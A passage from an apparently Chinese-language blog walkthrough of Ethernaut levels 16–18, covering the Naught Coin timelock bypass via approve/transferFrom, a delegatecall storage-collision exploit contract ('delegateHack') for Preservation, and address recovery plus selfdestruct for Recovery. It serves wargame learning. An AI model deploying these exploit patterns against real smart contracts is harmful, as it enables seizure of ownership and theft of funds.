keykey.enter(_gateKey);\r\n  }\r\n}</code></pre>\r\n<blockquote>\r\n<p>注意：<code>bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (type(uint64).max));</code>这行代码一开始copy进来<code>this</code>为<code>msg.sender</code>不能通过，题目中的<code>msg.sender</code>为攻击合约的地址</p>\r\n</blockquote>\r\n<h2 id=\"naught-coin\">16.Naught Coin</h2>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nimport 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';\r\n\r\n contract NaughtCoin is ERC20 {\r\n\r\n  // string public constant name = 'NaughtCoin';\r\n  // string public constant symbol = '0x0';\r\n  // uint public constant decimals = 18;\r\n  uint public timeLock = block.timestamp + 10 * 365 days;\r\n  uint256 public INITIAL_SUPPLY;\r\n  address public player;\r\n\r\n  constructor(address _player) \r\n  ERC20('NaughtCoin', '0x0') {\r\n    player = _player;\r\n    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));\r\n    // _totalSupply = INITIAL_SUPPLY;\r\n    // _balances[player] = INITIAL_SUPPLY;\r\n    _mint(player, INITIAL_SUPPLY);\r\n    emit Transfer(address(0), player, INITIAL_SUPPLY);\r\n  }\r\n  \r\n  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {\r\n    super.transfer(_to, _value);\r\n  }\r\n\r\n  // Prevent the initial owner from transferring tokens until the timelock has passed\r\n  modifier lockTokens() {\r\n    if (msg.sender == player) {\r\n      require(block.timestamp &gt; timeLock);\r\n      _;\r\n    } else {\r\n     _;\r\n    }\r\n  } \r\n} </code></pre>\r\n<p>但是部署的时候出现报错说找不到那个库，加上<code>@</code>也不行</p>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/fhJNQA64gIMwukB.png\" alt=\"image-20230208100556034.png\"></p>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/ma4TjPUE3ZeGzos.png\" alt=\"image-20230208100608532.png\"></p>\r\n<p>修改代码为：</p>\r\n<pre class=\"solidity\"><code>import '@openzeppelin/contracts/token/ERC20/ERC20.sol';</code></pre>\r\n<h3 id=\"erc20\"><code>ERC20</code></h3>\r\n<p>https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md</p>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./IERC20.sol\";\r\nimport \"./extensions/IERC20Metadata.sol\";\r\nimport \"../../utils/Context.sol\";\r\n\r\n/**\r\n * @dev Implementation of the {IERC20} interface.\r\n *\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract using {_mint}.\r\n * For a generic mechanism see {ERC20PresetMinterPauser}.\r\n *\r\n * TIP: For a detailed writeup see our guide\r\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\r\n * to implement supply mechanisms].\r\n *\r\n * The default value of {decimals} is 18. To change this, you should override\r\n * this function so it returns a different value.\r\n *\r\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\r\n * instead returning `false` on failure. This behavior is nonetheless\r\n * conventional and does not conflict with the expectations of ERC20\r\n * applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all accounts just\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn't required by the specification.\r\n *\r\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\r\n * functions have been added to mitigate the well-known issues around setting\r\n * allowances. See {IERC20-approve}.\r\n */\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address =&gt; uint256) private _balances;\r\n\r\n    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    /**\r\n     * @dev Sets the values for {name} and {symbol}.\r\n     *\r\n     * All two of these values are immutable: they can only be set once during\r\n     * construction.\r\n     */\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei. This is the default value returned by this function, unless\r\n     * it's overridden.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `to` cannot be the zero address.\r\n     * - the caller must have a balance of at least `amount`.\r\n     */\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     *\r\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\r\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     *\r\n     * NOTE: Does not update the allowance if the current allowance\r\n     * is the maximum `uint256`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` and `to` cannot be the zero address.\r\n     * - `from` must have a balance of at least `amount`.\r\n     * - the caller must have allowance for ``from``'s tokens of at least\r\n     * `amount`.\r\n     */\r\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     * - `spender` must have allowance for the caller of at least\r\n     * `subtractedValue`.\r\n     */\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance &gt;= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves `amount` of tokens from `from` to `to`.\r\n     *\r\n     * This internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` cannot be the zero address.\r\n     * - `to` cannot be the zero address.\r\n     * - `from` must have a balance of at least `amount`.\r\n     */\r\n    function _transfer(address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance &gt;= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\r\n            // decrementing then incrementing.\r\n            _balances[to] += amount;\r\n        }\r\n\r\n        emit Transfer(from, to, amount);\r\n\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\r\n     * the total supply.\r\n     *\r\n     * Emits a {Transfer} event with `from` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     */\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        unchecked {\r\n            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.\r\n            _balances[account] += amount;\r\n        }\r\n        emit Transfer(address(0), account, amount);\r\n\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Destroys `amount` tokens from `account`, reducing the\r\n     * total supply.\r\n     *\r\n     * Emits a {Transfer} event with `to` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     * - `account` must have at least `amount` tokens.\r\n     */\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance &gt;= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n            // Overflow not possible: amount &lt;= accountBalance &lt;= totalSupply.\r\n            _totalSupply -= amount;\r\n        }\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\r\n     *\r\n     * Does not update the allowance amount in case of infinite allowance.\r\n     * Revert if not enough allowance is available.\r\n     *\r\n     * Might emit an {Approval} event.\r\n     */\r\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance &gt;= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called before any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\r\n     * will be transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n\r\n    /**\r\n     * @dev Hook that is called after any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\r\n     * has been transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n}</code></pre>\r\n<blockquote>\r\n<p>注意：</p>\r\n<ul>\r\n<li>使用solidity<code>0.4.17</code>（或更高版本）的语法</li>\r\n<li>调用者必须处理<code>false</code>来自<code>returns (bool success)</code>.\r\n调用者不得假设<code>false</code>永远不会返回！</li>\r\n</ul>\r\n</blockquote>\r\n<p>函数解析：</p>\r\n<ul>\r\n<li>构造函数，给令牌名称和符号</li>\r\n</ul>\r\n<pre class=\"solidity\"><code>    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }</code></pre>\r\n<ul>\r\n<li><p>返回令牌的名称 - 例如<code>\"MyToken\"</code>。</p>\r\n<p>可选 -\r\n此方法可用于提高可用性，但接口和其他契约不得期望这些值存在。</p></li>\r\n</ul>\r\n<pre class=\"solidity\"><code>    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }</code></pre>\r\n<ul>\r\n<li><p>返回令牌的符号。例如“HIX”。</p>\r\n<p>可选 -\r\n此方法可用于提高可用性，但接口和其他契约不得期望这些值存在。</p></li>\r\n</ul>\r\n<pre class=\"solidity\"><code>    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }</code></pre>\r\n<ul>\r\n<li><p>返回令牌使用的小数位数 -\r\n例如<code>8</code>，表示将令牌数量除以<code>100000000</code>得到其用户表示。</p>\r\n<p>可选 -\r\n此方法可用于提高可用性，但接口和其他契约不得期望这些值存在。</p></li>\r\n</ul>\r\n<pre class=\"solidity\"><code>    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }</code></pre>\r\n<ul>\r\n<li>返回代币总供应量。</li>\r\n</ul>\r\n<pre class=\"solidity\"><code>    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }</code></pre>\r\n<ul>\r\n<li>返回地址为<code>account</code>的另一个帐户的帐户余额。</li>\r\n</ul>\r\n<pre class=\"solidity\"><code>    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }</code></pre>\r\n<ul>\r\n<li><p>将<code>_value</code>令牌数量转移到地址<code>_to</code>，并且必须触发<code>Transfer</code>事件。如果消息调用者的帐户余额没有足够的代币可花费，则该函数应该<code>throw</code>。</p>\r\n<p>注意 0\r\n值的传输必须被视为正常传输并触发<code>Transfer</code>事件。</p></li>\r\n</ul>\r\n<pre class=\"solidity\"><code>    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }</code></pre>\r\n<ul>\r\n<li><p>允许<code>_spender</code>多次从您的帐户中提款，最多不超过<code>_value</code>金额。如果再次调用此函数，它会用\r\n覆盖当前的容差<code>_value</code>。</p>\r\n<p><strong>注意</strong>：为了防止像这里描述和讨论的攻击媒介，客户应该确保创建用户界面时，他们首先将允许额度设置为<code>0</code>，然后再为同一支出者将其设置为另一个值。虽然合约本身不应该强制执行它，以允许与之前部署的合约向后兼容</p></li>\r\n</ul>\r\n<pre class=\"solidity\"><code>    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }</code></pre>\r\n<ul>\r\n<li><p>将<code>amount</code>令牌数量从 address <code>_from</code>转移到\r\naddress <code>_to</code>，并且必须触发<code>Transfer</code>事件。</p>\r\n<p>该<code>transferFrom</code>方法用于撤回工作流程，允许合约代表您转移代币。例如，这可以用于允许合同代表您转移代币和/或以子货币收取费用。该功能应该<code>throw</code>，除非<code>_from</code>帐户通过某种机制故意授权消息的发送者。</p>\r\n<p>注意 0\r\n值的传输必须被视为正常传输并触发<code>Transfer</code>事件。</p></li>\r\n</ul>\r\n<pre class=\"solidity\"><code>    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }</code></pre>\r\n<ul>\r\n<li><code>spender</code>返回仍允许从<code>owner</code>中提取的金额。</li>\r\n</ul>\r\n<pre class=\"solidity\"><code>    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }</code></pre>\r\n<h3 id=\"随机数\">随机数</h3>\r\n<p>题目源码里面有个<code>bolck.timestamp</code></p>\r\n<ul>\r\n<li><code>block.timestamp</code>表示当前区块何时被挖出来的</li>\r\n<li><code>now</code>表示当前时间戳信息</li>\r\n</ul>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/Iea4TtuASPglxkf.png\" alt=\"image-20230208151045245.png\"></p>\r\n<ul>\r\n<li><code>block.coinbase</code>表示挖当前区块的矿工地址</li>\r\n<li><code>block.difficulty</code>表示这个区块的挖矿难度</li>\r\n<li><code>blovk.gaslimit</code>表示交易中所限制的最大的gas值</li>\r\n<li><code>block.number</code>表示当前区块的高度</li>\r\n</ul>\r\n<p>题目要求我们账户代币余额为0</p>\r\n<p>有个修饰器，要求</p>\r\n<pre class=\"solidity\"><code>    if (msg.sender == player) {\r\n      require(block.timestamp &gt; timeLock);\r\n      _;\r\n    } else {\r\n     _;\r\n    }\r\n  } </code></pre>\r\n<p>但是因为<code>uint public timeLock = block.timestamp + 10 * 365 days;</code></p>\r\n<p>修饰器对<code>transfer</code>函数进行限定，所以要求无法实现</p>\r\n<p>了解<code>ERC20</code>之后知道转账除了<code>transfer()</code>函数外还有一种方法，就是<code>approve()</code>和<code>transferFrom()</code>结合使用</p>\r\n<ul>\r\n<li>先调用<code>approve()</code>，允许代表所有者<code>spender</code>花费<code>amount</code>的代币数量。</li>\r\n</ul>\r\n<pre class=\"solidity\"><code>    function approve(address spender, uint256 amount) public virtual override returns (bool);</code></pre>\r\n<ul>\r\n<li>再调用<code>transferFrom()</code>，将批准的令牌<code>amount</code>从所有者<code>from</code>帐户转移到上一步中批准<code>to</code>的地址中。</li>\r\n</ul>\r\n<pre class=\"solidity\"><code>    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool);</code></pre>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/aLho9jumFSgsVY2.png\" alt=\"image-20230208205631925.png\"></p>\r\n<blockquote>\r\n<p>注意：最后用<code>transferFrom()</code>转账时，要使用被批准账户<code>spender</code>来调用该函数才能成功</p>\r\n<p><code>override</code>:子合约重写了父合约中的函数，需要加上override关键字。</p>\r\n</blockquote>\r\n<h2 id=\"preservation\">17.Preservation</h2>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Preservation {\r\n\r\n  // public library contracts \r\n  address public timeZone1Library;\r\n  address public timeZone2Library;\r\n  address public owner; \r\n  uint storedTime;\r\n  // Sets the function signature for delegatecall\r\n  bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\r\n\r\n  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {\r\n    timeZone1Library = _timeZone1LibraryAddress; \r\n    timeZone2Library = _timeZone2LibraryAddress; \r\n    owner = msg.sender;\r\n  }\r\n \r\n  // set the time for timezone 1\r\n  function setFirstTime(uint _timeStamp) public {\r\n    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\r\n  }\r\n\r\n  // set the time for timezone 2\r\n  function setSecondTime(uint _timeStamp) public {\r\n    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\r\n  }\r\n}\r\n\r\n// Simple library contract to set the time\r\ncontract LibraryContract {\r\n\r\n  // stores a timestamp \r\n  uint storedTime;  \r\n\r\n  function setTime(uint _time) public {\r\n    storedTime = _time;\r\n  }\r\n}</code></pre>\r\n<p>题目要求我们取代成为第一个合约的owner</p>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/7ZTzlRKp8cweGjH.png\" alt=\"image-20230209220709385.png\"></p>\r\n<p>反编译一手发现owner存储在storage2</p>\r\n<p>看下能不能尝试改变</p>\r\n<ul>\r\n<li><code>Preservation Contract</code></li>\r\n</ul>\r\n<p>定义了一些状态变量，其中第一个和第二个变量保存库的地址，第三个变量是我们需要存储地址的所有者。这些地址是在构造函数中预定义的，无法更改。</p>\r\n<ul>\r\n<li><p><code>Library Contract</code></p></li>\r\n<li><p>这定义了一个<code>storedTime</code>在 slot 0\r\n中调用的变量，它映射到<code>address public timeZone1Library</code>保存合约中的变量。</p>\r\n<p>该函数<code>setTime()</code>接受一个由我们控制并存储在上述变量中的输入。</p></li>\r\n</ul>\r\n<p>分析如何修改owner：</p>\r\n<p>以合同为例。当<code>Preservation</code>合约执行<code>setTime(100)</code>时，它会通过<code>delegatecall</code>调用<code>LibraryContract.setTime(100)</code></p>\r\n<p><strong>如果<code>LibraryContract</code>修改状态，它不会修改自己的状态，而是修改调用者（<code>Preservation</code>）的状态！</strong></p>\r\n<p>这意味着当<code>LibraryContract.setTime</code>更新<code>storedTime</code>状态变量时，不是从它自己的合约更新变量，而是更新调用者合约的<strong>slot0</strong>中的变量，即<code>timeZone1Library</code>地址。</p>\r\n<p>执行<code>setSecondTime</code>函数时会发生同样的事情，它将更新合约<strong>slot0</strong>中的变量。<code>Preservation</code></p>\r\n<p>攻击合约</p>\r\n<pre class=\"solidity\"><code>contract delegateHack{\r\n  address public timeZone1Library;\r\n  address public timeZone2Library;\r\n  address public owner;\r\n\r\n  Preservation add;\r\n\r\n  constructor(address _addr) public {\r\n      add=Preservation(_addr);\r\n  }\r\n\r\n  function exploit() external{\r\n    add.setFirstTime(uint256(uint160(address(this))));\r\n    add.setFirstTime(uint256(uint160(msg.sender)));\r\n    require(add.owner()==msg.sender,\"hack failed\");\r\n    }\r\n\r\n  function setTime(uint _owner) public {\r\n      owner = address(uint160(_owner));\r\n    }\r\n}</code></pre>\r\n<p>最后那个<code>setTime</code>函数一开始写成这样是错的：</p>\r\n<pre class=\"solidity\"><code>  function setTime(address _owner) public{\r\n    owner = _owner;\r\n  }</code></pre>\r\n<p>可能是因为和源码的不一样导致owner的地址一直无法改变</p>\r\n<p>部署一下使用<code>exploit</code>函数即可</p>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/9HdhLTolVMWJXZO.png\" alt=\"image-20230210125257504.png\"></p>\r\n<h2 id=\"recovery\">18.Recovery</h2>\r\n<h3 id=\"create和create2在之前写的solidity进阶里面有\"><code>create</code>和<code>create2</code>（在之前写的solidity进阶里面有）</h3>\r\n<p>在合约中创建新合约</p>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/3jF1ugPYMpNXWDw.png\" alt=\"image-20230319111508702.png\"></p>\r\n<h3 id=\"以太坊合约的地址计算httpsethereum.stackexchange.comquestions760how-is-the-address-of-an-ethereum-contract-computed761761\">以太坊合约的地址计算（https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed/761#761）</h3>\r\n<p>以太坊合约的地址是根据其创建者的地址 ( ) 和创建者发送的交易数量 (\r\n)<strong>确定性计算的。</strong> The <code>sender</code> and\r\n<code>nonce</code> are RLP encoded and then <strong>hashed with\r\nKeccak-256</strong>.</p>\r\n<p>在<code>solidity</code>中：</p>\r\n<pre class=\"solidity\"><code>//  nonce 为 0 时生成的地址\r\nnonce0= \r\naddress(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, bytes1(0x80))))));\r\nnonce1= address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, bytes1(0x01))))));</code></pre>\r\n<blockquote>\r\n<p>注意：在这题中</p>\r\n<ul>\r\n<li>发送者<code>_origin</code>是<code>Recover</code>合约本身</li>\r\n<li>nonce\r\n是合约本身创建的合约编号。需要记住的重要一点：合约的随机数<strong>从 1\r\n而不是 0</strong> 开始！</li>\r\n</ul>\r\n</blockquote>\r\n<pre class=\"solidity\"><code>contract locate{\r\n  address public lostaddr = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(0xe28517966fff65C678F1393b121ABF262A7Df53D\r\n), bytes1(0x01))))));\r\n}</code></pre>\r\n<blockquote>\r\n<p>注意：<code>address(0xe28517966fff65C678F1393b121ABF262A7Df53D )</code>是本题中的发送者。</p>\r\n</blockquote>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/uSrsqUpnGdNTZXH.png\" alt=\"image-20230319114925230.png\"></p>\r\n<p>得到的这个地址把他拿到区块链浏览器上看看来源</p>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/76aB29qlQO3gGuZ.png\" alt=\"image-20230319115023581.png\"></p>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/FMUSWvXzG2d5Imp.png\" alt=\"image-20230319115034341.png\"></p>\r\n<p>确定是丢失的地址</p>\r\n<p>部署该地址的<code>Recover</code>合约，并且调用<code>selfdestruct</code>函数把钱转走就完成了</p>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/o2EJm1ytZAUjzpc.png\" alt=\"image-20230319115140212.png\"></p>\r\n","text":"title: Ethernaut题解1-18 date: 2023-03-24 22:20:57 tags: solidity靶场 cover: 'https://s2.loli.net/2022/12/17/eOYWR2zZ9rqSchP.jpg' Ethernaut 1.He...","link":"","photos":[],"count_time":{"symbolsCount":"53k","symbolsTime":"48 mins."},"categories":[],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ethernaut\"><span class=\"toc-text\">Ethernaut</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#hello\"><span class=\"toc-text\">1.Hello</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#fallback\"><span class=\"toc-text\">2.Fallback</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#fallout\"><span class=\"toc-text\">3.Fallout</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#coin-flip\"><span class=\"toc-text\">4.Coin Flip</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#tip%E5%86%99%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">Tip：写攻击合约的两种方式</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#telephone\"><span class=\"toc-text\">5.Telephone</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#token\"><span class=\"toc-text\">6.Token</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#delegation%E5%A4%9A%E6%83%B3%E6%83%B3\"><span class=\"toc-text\">7.Delegation（多想想）</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#force\"><span class=\"toc-text\">8.Force</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#vault\"><span class=\"toc-text\">9.Vault</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#king\"><span class=\"toc-text\">10.King</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#re-entrancy\"><span class=\"toc-text\">11.Re-entrancy</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#elevator\"><span class=\"toc-text\">12.Elevator</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#privacy\"><span class=\"toc-text\">13.Privacy</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E5%8F%8D%E7%BC%96%E8%AF%91%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">查看反编译内容</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" 